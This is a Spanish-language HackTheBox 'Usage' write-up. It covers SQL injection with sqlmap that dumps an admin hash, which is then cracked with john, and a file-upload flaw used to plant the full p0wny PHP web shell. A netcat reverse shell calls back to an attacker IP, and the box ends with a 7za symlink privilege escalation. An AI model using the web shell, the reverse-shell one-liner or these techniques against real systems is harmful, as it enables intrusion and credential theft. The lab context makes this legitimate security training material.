---
title: "HTB - Usage"
description: HTB - Usage
publishDate: 2024-06-05
tags:
  - HackTheBox
  - Easy
  - AD
  - nxc
  - DACL
  - Kerberos
  - DPAPI
  - bloodhound
  - john

---

## Box Info

| Name                  | Usage            | 
| :-------------------- | ---------------: |
| Release Date          | 13 Apr, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## Recon

```zsh
# Nmap 7.94SVN scan initiated Sun Jun  2 20:56:08 2024 as: nmap -sCV -p 22,80 -oN targete
       │ d 10.10.11.18
   2   │ Nmap scan report for 10.10.11.18
   3   │ Host is up (0.084s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
   9   │ |_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
  10   │ 80/tcp open  http    nginx 1.18.0 (Ubuntu)
  11   │ |_http-server-header: nginx/1.18.0 (Ubuntu)
  12   │ |_http-title: Did not follow redirect to <http://usage.htb/>
  13   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  14   │ 
  15   │ Service detection performed. Please report any incorrect results at <https://nmap.org/subm>
       │ it/ .
  16   │ # Nmap done at Sun Jun  2 20:56:18 2024 -- 1 IP address (1 host up) scanned in 10.52 seco
       │ nds

```

```zsh
wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --hc 400,404,403,302,301 -H "Host: FUZZ.usage.htb" -u [<http://usage.htb>](<http://usage.htb/>) -t 100
```

![](Untitled.png)

Intente buscar alguna vulnerabilidad para laravel pero no encontre nada asi que intente con algun XSS y tampoco obtuve nada asi que intente por SQLInjection

![Image](Untitled1.png)

SQLInjection:

‘ ORDER BY 8;— -

‘ ORDER BY 9;— -

![Image](Untitled2.png)

![Image](Untitled3.png)

copy and paste to > request.txt for sqlmap option

```zsh
sqlmap -r request.txt --level 5 --risk 3  -p email --threads 10 --dbs --batch
```

![Image](Untitled4.png)
![Image](Untitled5.png)
![Image](Untitled6.png)
![Image](Untitled7.png)
![Image](Untitled8.png)


```zsh
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
```

![Image](Untitled9.png)

```zsh
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+----------+--------------------------------------------------------------+
```

```zsh
echo "$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2" > hash.txt
```

![Image](Untitled10.png)

```zsh
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt password.txt
```

![Image](Untitled11.png)

Usamos las credenciales para logearnos

![Image](Untitled12.png)

Encontre esta vulnerabilidad para laravel encore

![Image](Untitled13.png)

Coincide porque tenemos un apartado para subir un archivo imagen

![Image](Untitled14.png)

```bash
<?php

$SHELL_CONFIG = array(
    'username' => 'p0wny',
    'hostname' => 'shell',
);

function expandPath($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        exec("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function allFunctionExist($list = array()) {
    foreach ($list as $entry) {
        if (!function_exists($entry)) {
            return false;
        }
    }
    return true;
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\\n", $output);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
        $output = stream_get_contents($pipes[1]);
        proc_close($handle);
    }
    return $output;
}

function isRunningWindows() {
    return stripos(PHP_OS, "WIN") === 0;
}

function featureShell($cmd, $cwd) {
    $stdout = "";

    if (preg_match("/^\\s*cd\\s*(2>&1)?$/", $cmd)) {
        chdir(expandPath("~"));
    } elseif (preg_match("/^\\s*cd\\s+(.+)\\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/", $cmd, $match);
        chdir(expandPath($match[1]));
    } elseif (preg_match("/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        $stdout = executeCommand($cmd);
    }

    return array(
        "stdout" => base64_encode($stdout),
        "cwd" => base64_encode(getcwd())
    );
}

function featurePwd() {
    return array("cwd" => base64_encode(getcwd()));
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \\"$cmd\\"";
    $files = explode("\\n", shell_exec($cmd));
    foreach ($files as &$filename) {
        $filename = base64_encode($filename);
    }
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => base64_encode('File not found / no read permission.'),
            'cwd' => base64_encode(getcwd())
        );
    } else {
        return array(
            'name' => base64_encode(basename($filePath)),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => base64_encode('Invalid path / no write permission.'),
            'cwd' => base64_encode(getcwd())
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => base64_encode('Done.'),
            'cwd' => base64_encode(getcwd())
        );
    }
}

function initShellConfig() {
    global $SHELL_CONFIG;

    if (isRunningWindows()) {
        $username = getenv('USERNAME');
        if ($username !== false) {
            $SHELL_CONFIG['username'] = $username;
        }
    } else {
        $pwuid = posix_getpwuid(posix_geteuid());
        if ($pwuid !== false) {
            $SHELL_CONFIG['username'] = $pwuid['name'];
        }
    }

    $hostname = gethostname();
    if ($hostname !== false) {
        $SHELL_CONFIG['hostname'] = $hostname;
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
} else {
    initShellConfig();
}

?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>p0wny@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
                width: 100vw;
                height: 100vh;
                overflow: hidden;
            }

            *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }

            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }

            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }

            #shell {
                background: #222;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
                max-width: calc(100vw - 2 * var(--shell-margin));
                max-height: calc(100vh - 2 * var(--shell-margin));
                resize: both;
                overflow: hidden;
                width: 100%;
                height: 100%;
                margin: var(--shell-margin) auto;
            }

            #shell-content {
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            :root {
                --shell-margin: 25px;
            }

            @media (min-width: 1200px) {
                :root {
                    --shell-margin: 50px !important;
                }
            }

            @media (max-width: 991px),
                   (max-height: 600px) {
                #shell-logo {
                    font-size: 6px;
                    margin: -25px 0;
                }
                :root {
                    --shell-margin: 0 !important;
                }
                #shell {
                    resize: none;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            @media (max-width: 320px) {
                #shell-logo {
                    font-size: 5px;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
                padding: 10px 0;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
                box-sizing: border-box;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
        </style>

        <script>
            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;

            function _insertCommand(command) {
                eShellContent.innerHTML += "\\n\\n";
                eShellContent.innerHTML += '<span class=\\"shell-prompt\\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _defer(callback) {
                setTimeout(callback, 0);
            }

            function featureShell(command) {

                _insertCommand(command);
                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {
                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);
                } else if (/^\\s*clear\\s*$/.test(command)) {
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(atob(response.name), response.file)
                        } else {
                            _insertStdout(atob(response.stdout));
                            updateCwd(atob(response.cwd));
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;  // no completion
                    data.files = data.files.map(function(file){
                        return atob(file);
                    });
                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(atob(response.stdout));
                            updateCwd(atob(response.cwd));
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\\"" + cwd + "\\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = atob(response.cwd);
                    _updatePrompt();
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.value = commandHistory[historyPosition];
                            _defer(function() {
                                eShellCmdInput.focus();
                            });
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            document.onclick = function(event) {
                event = event || window.event;
                var selection = window.getSelection();
                var target = event.target || event.srcElement;

                if (target.tagName === "SELECT") {
                    return;
                }

                if (!selection.toString()) {
                    eShellCmdInput.focus();
                }
            };

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
        </script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
        ___                         ____      _          _ _        _  _   <span></span>
 _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>
| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>
| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>
| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>
|_|                         |___/  \\____/                                  <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>
```

[https://github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell)

![Image](Untitled15.png)

![Image](Untitled16.png)


```zsh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.45 7272 >/tmp/f
```

- `rm /tmp/f;`: Esto elimina cualquier archivo llamado "f" en el directorio `/tmp`. `rm` es el comando para eliminar archivos.
- `mkfifo /tmp/f;`: Esto crea un "named pipe" (tubería con nombre) llamado "f" en el directorio `/tmp`. Un named pipe es un tipo de archivo especial que permite la comunicación entre procesos.
- `cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.25 10032 >/tmp/f`: Este es el comando principal y se desglosa en varias partes:
    - `cat /tmp/f`: Lee el contenido de la tubería con nombre `/tmp/f`.
    - `|`: El símbolo de tubería (pipe) conecta la salida de un comando con la entrada de otro.
    - `/bin/sh -i`: Inicia un shell interactivo. `/bin/sh` es el intérprete de comandos (shell), y `i` indica que se inicie en modo interactivo.
    - `2>&1`: Redirige la salida de error estándar (stderr) al mismo lugar que la salida estándar (stdout). Esto significa que los errores también se enviarán a través de la tubería.
    - `|`: Otra tubería para conectar la salida del shell con el siguiente comando.
    - `nc 10.10.14.25 10032`: Ejecuta `nc` (netcat) para establecer una conexión de red con la dirección IP `10.10.14.25` en el puerto `10032`. Esto establecerá una conexión a una máquina remota en el puerto especificado.
    - `>/tmp/f`: Redirige la salida estándar (stdout) del comando `nc` de vuelta a la tubería con nombre `/tmp/f`. Esto cierra el ciclo, haciendo que cualquier salida generada en la máquina remota a través de la conexión `nc` se envíe de vuelta a la máquina original a través de la tubería con nombre.

Obtendremos una shell inversa (reverse shell)

![Image](Untitled17.png)

Descargamos el id_rsa para entrar por ssh

chmod 400 id_rsa

```zsh
ssh -i id_rsa dash@10.10.11.18
```

![Image](Untitled18.png)

Una vez obtenido la consola interactiva con ssh podremos brincar a un nuevo usuario con mayor privilegios (xander)

![Image](Untitled19.png)

> Monit es particularmente útil para monitorear procesos daemon, como aquellos iniciados al arrancar el sistema. Por ejemplo, sendmail, sshd, apache y mysql.

```zsh
cat ~/.monitrc
```

![Image](Untitled20.png)

```zsh
ssh xander@10.10.11.18
```

```zsh
password: 3nc0d3d_pa$$w0rd
```

ejecutamos "id" para enumerar 

![Image](Untitled21.png)

```zsh
sudo -l
```

![Image](Untitled22.png)

Revisamos esta herramienta que podemos ejecutar sin proporcionar contraseña de root

![Image](Untitled23.png)

/ usr/bin/7za: Es la ruta al comando 7za, que indica el comando a ejecutar.

a: significa agregar archivos al archivo comprimido.

/var/backups/project.zip: La ruta y nombre del archivo comprimido. El archivo Zip a crear se llama project.zip y está ubicado en el directorio /var/backups/.

-tzip: Especifica el tipo de archivo comprimido en formato ZIP.

-snl: Desactiva la compresión de enlaces simbólicos suaves. Esta opción le dice a 7za que no incluya enlaces simbólicos al comprimir, sino que comprima directamente los archivos destino de los enlaces simbólicos.

-mmt: Usa multi-threading para operaciones de compresión para acelerar la compresión.

-- *: Esta parte indica los parámetros del comando, -- indica que los parámetros siguientes son todos nombres de archivos, y * indica todos los archivos y carpetas en el directorio actual.

![Image](Untitled24.png)

Principalmente observa -snl, que comprime directamente el archivo destino del enlace simbólico suave, lo que significa que podemos establecer una conexión suave a un directorio de altos privilegios y leer el contenido de los archivos del directorio de altos privilegios.

![Image](Untitled25.png)
